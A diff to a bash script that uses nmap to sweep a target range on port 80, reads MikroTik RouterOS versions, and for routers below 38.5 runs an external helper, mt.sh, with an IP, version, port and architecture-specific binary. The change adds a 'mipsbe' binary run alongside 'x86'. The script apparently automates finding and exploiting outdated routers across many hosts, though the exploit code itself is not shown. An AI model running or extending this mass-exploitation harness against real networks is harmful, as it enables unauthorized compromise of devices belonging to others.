@@ -1,7 +1,7 @@
 #!/bin/bash
 clear
-killall - 9 watch
-gnome-terminal --command="watch -n 2 'cat -A bambam.txt'"
+killall -9 watch
+gnome-terminal --command="watch -n 2 'cat bambam.txt'"
 nmap_path=`which nmap`
 file_name=`echo $1 | awk -F "/" '{print $1}'`
 echo 'running nmap'
@@ -10,10 +10,7 @@ $nmap_path -T5 -sT -p 80 --open $1 -oG - | awk '$4=="Ports:"{print $2,":"$5}' | 
  #file_content=`cat output_$file_name.txt`
  IFS=$'\r\n' GLOBIGNORE='*' command eval  'arr=($(cat output_$file_name.txt))'
 
-
-
-
-echo 'testing ips'
+echo 'nmap finished'
 for i in "${arr[@]}"
 do
 
@@ -24,18 +21,19 @@ do
 	version_ok=38.5
 if [ -z "$ver" ]
 	then
-		echo "Jo Mikrotik" #> /dev/null
+		echo "No Mikrotik" #> /dev/null
 	else
 		if [[ "$ver" < "$version_ok" ]]
 		then
-			#echo $i---VERSION----$ver
 			ip=`echo $i | awk -F ":" '{print $1}'`
 			port=`echo $i | awk -F ":" '{print $2}'`
-			#echo 'test'
 			echo $ip $port $ver_total
+			echo 'testing with mipsbe binary...'
+			./mt.sh $ip $ver_total  $port 'mipsbe'
+			echo 'testing with x86 binary...'
 			./mt.sh $ip $ver_total  $port 'x86'
 		else
 			echo "Not supported" #> /dev/null
-		fi		
-fi			
+		fi
+fi
 done
